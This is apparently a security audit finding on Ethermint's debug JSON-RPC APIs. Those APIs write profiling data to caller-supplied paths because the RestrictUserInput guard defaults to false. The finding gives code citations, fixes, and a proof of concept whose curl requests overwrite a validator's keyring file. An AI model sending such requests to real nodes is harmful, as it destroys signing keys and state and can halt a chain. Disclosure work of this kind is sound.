### Title
Debug JSON-RPC File-Write APIs Allow Arbitrary Filesystem Overwrites When `RestrictUserInput=false` (Default) - (File: `rpc/namespaces/ethereum/debug/api.go`, `rpc/namespaces/ethereum/debug/utils.go`)

---

### Summary

The Ethermint `debug` JSON-RPC namespace exposes multiple file-writing APIs (`StartCPUProfile`, `CpuProfile`, `GoTrace`, `StartGoTrace`, `BlockProfile`, `WriteBlockProfile`, `WriteMemProfile`, `MutexProfile`, `WriteMutexProfile`) that write to attacker-supplied filesystem paths. The `RestrictUserInput` configuration flag, which is the only guard against arbitrary path writes, defaults to `false`. When the `debug` namespace is enabled (as it is in the provided `init.sh` example and many production deployments), any unauthenticated caller can overwrite arbitrary files on the node's filesystem — including keyring files, config files, and database files — with pprof/trace binary data, truncating them in the process. There is no enforcement or warning when the `debug` namespace is enabled without `RestrictUserInput=true`.

---

### Finding Description

**Root cause — `validatePath` and `restrictedCreate` in `rpc/namespaces/ethereum/debug/utils.go`:**

`validatePath` only enforces path restrictions when `RestrictUserInput=true`:

```go
func validatePath(ctx *server.Context, file string) (string, error) {
    fp, err := ExpandHome(file)
    ...
    fp, err = filepath.Abs(fp)
    ...
    if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
        // restrict to data directory only when flag is set
        ...
    }
    return fp, nil  // unrestricted path returned when flag is false
}
``` [1](#0-0) 

`restrictedCreate` uses `os.Create` (which truncates existing files) when `RestrictUserInput=false`:

```go
func restrictedCreate(ctx *server.Context, fp string) (*os.File, error) {
    if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
        return os.OpenFile(fp, os.O_RDWR|os.O_CREATE|os.O_EXCL, 0o666)
    }
    return os.Create(fp)  // truncates any existing file
}
``` [2](#0-1) 

Every file-writing API in the debug namespace flows through these two functions: [3](#0-2) [4](#0-3) [5](#0-4) 

**Default configuration — `RestrictUserInput=false`:** [6](#0-5) 

The config template comment acknowledges the risk but does not enforce it: [7](#0-6) 

**No authentication on the JSON-RPC server:**

The HTTP server has no authentication middleware. Any caller who can reach the server's address can invoke debug APIs: [8](#0-7) 

**`debug` namespace registered as `Public: true`:** [9](#0-8) 

**Debug namespace commonly enabled in practice:**

The provided `init.sh` example explicitly enables it: [10](#0-9) 

---

### Impact Explanation

An unauthenticated attacker who can reach the JSON-RPC server when the `debug` namespace is enabled can call `debug_startCPUProfile`, `debug_writeMemProfile`, `debug_goTrace`, etc. with a path pointing to any file the node process has write access to (e.g., `~/.ethermintd/keyring-file/`, `~/.ethermintd/config/app.toml`, or the underlying LevelDB/RocksDB data directory). `os.Create` truncates the target file and overwrites it with binary pprof/trace data. This corrupts the targeted file irreversibly at the OS level.

Concrete consequences:
- **Keyring file overwrite**: The node can no longer decrypt signing keys → validator stops producing/signing blocks → consensus failure / chain halt.
- **Database file overwrite**: Committed state is corrupted → node panics on next read → chain halt.
- **Config file overwrite**: Node crashes on restart.

This matches the allowed impact: *"Public JSON-RPC path exposes a reachable route to chain halt or corrupt committed state."*

---

### Likelihood Explanation

- The `debug` namespace is not in the default API list (`eth,net,web3`), but the official `init.sh` example and many operator guides explicitly enable it for troubleshooting.
- `RestrictUserInput` defaults to `false` in `DefaultJSONRPCConfig()`. Operators who enable `debug` without reading the config comment are immediately vulnerable.
- The JSON-RPC server binds to `0.0.0.0:8545` by default with no authentication, making it reachable from any network interface.
- No warning, log message, or startup error is emitted when `debug` is enabled with `RestrictUserInput=false`.

This is a direct analog to the original report: sensitive capability (file writes) is available by default without a safety guard, and no warning is issued when the insecure configuration is active.

---

### Recommendation

1. **Default `RestrictUserInput` to `true`** in `DefaultJSONRPCConfig()` in `server/config/config.go`.
2. **Emit a startup warning** (or refuse to start) when the `debug` namespace is included in `API` and `RestrictUserInput=false`.
3. **Document** in the `debug` namespace API docstrings and README that `restrict-user-input = true` is mandatory when serving the `debug` namespace publicly.
4. Consider requiring explicit opt-in for each file-writing debug API rather than a single global flag.

---

### Proof of Concept

```bash
# Node started with debug namespace enabled and RestrictUserInput=false (default):
# ethermintd start --json-rpc.api eth,txpool,personal,net,debug,web3

# Attacker overwrites the node's keyring file with CPU profile data:
curl -X POST http://<node-ip>:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_startCPUProfile",
       "params":["/home/validator/.ethermintd/keyring-file/validator.info"],
       "id":1}'

# Wait 1 second, then stop:
curl -X POST http://<node-ip>:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_stopCPUProfile","params":[],"id":2}'

# Result: keyring file is now truncated and filled with pprof binary data.
# The validator node can no longer decrypt its signing key.
# Block production stops; if enough validators are affected, the chain halts.
```

### Citations

**File:** rpc/namespaces/ethereum/debug/utils.go (L59-91)
```go
func validatePath(ctx *server.Context, file string) (string, error) {
	fp, err := ExpandHome(file)
	if err != nil {
		return "", err
	}
	fp, err = filepath.Abs(fp)
	if err != nil {
		return "", err
	}
	if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
		absDataDir, err := filepath.Abs(ctx.Config.RootDir)
		if err != nil {
			return "", err
		}
		realDataDir, err := filepath.EvalSymlinks(absDataDir)
		if err != nil {
			return "", err
		}
		// Resolve parent dir symlinks; the file itself may not exist yet.
		realParent, err := filepath.EvalSymlinks(filepath.Dir(fp))
		if err != nil {
			return "", err
		}
		fp = filepath.Join(realParent, filepath.Base(fp))
		if !strings.HasPrefix(fp, realDataDir+string(filepath.Separator)) {
			return "", errors.New("file path must be in the data directory")
		}
		// Reject a pre-existing symlink at the final component.
		if fi, err := os.Lstat(fp); err == nil && fi.Mode()&os.ModeSymlink != 0 {
			return "", errors.New("file path must not be a symlink")
		}
	}
	return fp, nil
```

**File:** rpc/namespaces/ethereum/debug/utils.go (L94-101)
```go
// restrictedCreate opens fp for writing. In restricted mode it uses O_EXCL to
// prevent overwriting existing files; otherwise it truncates like os.Create.
func restrictedCreate(ctx *server.Context, fp string) (*os.File, error) {
	if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
		return os.OpenFile(fp, os.O_RDWR|os.O_CREATE|os.O_EXCL, 0o666)
	}
	return os.Create(fp)
}
```

**File:** rpc/namespaces/ethereum/debug/api.go (L163-174)
```go
func (a *API) BlockProfile(file string, nsec uint) error {
	d, err := parseDuration(nsec)
	if err != nil {
		return err
	}
	a.logger.Debug("debug_blockProfile", "file", file, "nsec", nsec)
	runtime.SetBlockProfileRate(1)
	defer runtime.SetBlockProfileRate(0)

	time.Sleep(d)
	return writeProfile("block", file, a.ctx, a.logger)
}
```

**File:** rpc/namespaces/ethereum/debug/api.go (L241-278)
```go
func (a *API) StartCPUProfile(file string) error {
	a.logger.Debug("debug_startCPUProfile", "file", file)
	a.handler.mu.Lock()
	defer a.handler.mu.Unlock()

	switch {
	case isCPUProfileConfigurationActivated(a.ctx):
		a.logger.Debug("CPU profiling already in progress using the configuration file")
		return errors.New("CPU profiling already in progress using the configuration file")
	case a.handler.cpuFile != nil:
		a.logger.Debug("CPU profiling already in progress")
		return errors.New("CPU profiling already in progress")
	default:
		fp, err := validatePath(a.ctx, file)
		if err != nil {
			a.logger.Debug("failed to get filepath for the CPU profile file", "error", err.Error())
			return err
		}
		f, err := restrictedCreate(a.ctx, fp)
		if err != nil {
			a.logger.Debug("failed to create CPU profile file", "error", err.Error())
			return err
		}
		if err := pprof.StartCPUProfile(f); err != nil {
			a.logger.Debug("cpu profiling already in use", "error", err.Error())
			if err := f.Close(); err != nil {
				a.logger.Debug("failed to close cpu profile file")
				return stderrors.Wrap(err, "failed to close cpu profile file")
			}
			return err
		}

		a.logger.Info("CPU profiling started", "profile", file)
		a.handler.cpuFile = f
		a.handler.cpuFilename = file
		return nil
	}
}
```

**File:** rpc/namespaces/ethereum/debug/trace.go (L27-59)
```go
func (a *API) StartGoTrace(file string) error {
	a.logger.Debug("debug_startGoTrace", "file", file)
	a.handler.mu.Lock()
	defer a.handler.mu.Unlock()

	if a.handler.traceFile != nil {
		a.logger.Debug("trace already in progress")
		return errors.New("trace already in progress")
	}

	fp, err := validatePath(a.ctx, file)
	if err != nil {
		a.logger.Debug("failed to validate trace file path", "error", err.Error())
		return err
	}

	f, err := restrictedCreate(a.ctx, fp)
	if err != nil {
		a.logger.Debug("failed to create go trace file", "error", err.Error())
		return err
	}
	if err := trace.Start(f); err != nil {
		a.logger.Debug("Go tracing already started", "error", err.Error())
		if err := f.Close(); err != nil {
			a.logger.Debug("failed to close trace file")
			return stderrors.Wrap(err, "failed to close trace file")
		}
		return err
	}
	a.handler.traceFile = f
	a.handler.traceFilename = file
	a.logger.Info("Go tracing started", "dump", a.handler.traceFilename)
	return nil
```

**File:** server/config/config.go (L262-288)
```go
func DefaultJSONRPCConfig() *JSONRPCConfig {
	return &JSONRPCConfig{
		Enable:                   true,
		API:                      GetDefaultAPINamespaces(),
		Address:                  DefaultJSONRPCAddress,
		WsAddress:                DefaultJSONRPCWsAddress,
		WsOrigins:                []string{},
		GasCap:                   DefaultGasCap,
		EVMTimeout:               DefaultEVMTimeout,
		TxFeeCap:                 DefaultTxFeeCap,
		FilterCap:                DefaultFilterCap,
		FeeHistoryCap:            DefaultFeeHistoryCap,
		BlockRangeCap:            DefaultBlockRangeCap,
		LogsCap:                  DefaultLogsCap,
		HTTPTimeout:              DefaultHTTPTimeout,
		HTTPIdleTimeout:          DefaultHTTPIdleTimeout,
		BatchRequestLimit:        DefaultBatchRequestLimit,
		BatchResponseMaxSize:     DefaultBatchResponseMaxSize,
		AllowUnprotectedTxs:      DefaultAllowUnprotectedTxs,
		MaxOpenConnections:       DefaultMaxOpenConnections,
		EnableIndexer:            false,
		AllowIndexerGap:          true,
		MetricsAddress:           DefaultJSONRPCMetricsAddress,
		FixRevertGasRefundHeight: DefaultFixRevertGasRefundHeight,
		ReturnDataLimit:          DefaultReturnDataLimit,
		RestrictUserInput:        false,
	}
```

**File:** server/config/toml.go (L119-121)
```go
# RestrictUserInput will restrict some user input to the JSON-RPC debug apis,
# must be set to true if serving debug namespace to the public.
restrict-user-input = {{ .JSONRPC.RestrictUserInput }}
```

**File:** server/json_rpc.go (L98-112)
```go
	r := mux.NewRouter()
	r.HandleFunc("/", rpcServer.ServeHTTP).Methods("POST")

	// config.API.EnableUnsafeCORS is shared with the REST API server, so it governs
	// CORS for both; they can't be toggled independently.
	rpcHandler := corsHandler(r, config.API.EnableUnsafeCORS)

	httpSrv := &http.Server{
		Addr:              config.JSONRPC.Address,
		Handler:           rpcHandler,
		ReadHeaderTimeout: config.JSONRPC.HTTPTimeout,
		ReadTimeout:       config.JSONRPC.HTTPTimeout,
		WriteTimeout:      config.JSONRPC.HTTPTimeout,
		IdleTimeout:       config.JSONRPC.HTTPIdleTimeout,
	}
```

**File:** rpc/apis.go (L161-177)
```go
		DebugNamespace: func(ctx *server.Context,
			clientCtx client.Context,
			_ *stream.RPCStream,
			allowUnprotectedTxs bool,
			indexer ethermint.EVMTxIndexer,
			mempoolClient appmempool.MempoolClient,
		) []rpc.API {
			evmBackend := backend.NewBackend(ctx, ctx.Logger, clientCtx, allowUnprotectedTxs, indexer, backend.WithMempoolClient(mempoolClient))
			return []rpc.API{
				{
					Namespace: DebugNamespace,
					Version:   apiVersion,
					Service:   debug.NewAPI(ctx, evmBackend),
					Public:    true,
				},
			}
		},
```

**File:** init.sh (L73-73)
```shellscript
ethermintd start --metrics --pruning=nothing --rpc.unsafe --keyring-backend test --log_level info --json-rpc.api eth,txpool,personal,net,debug,web3 --api.enable
```
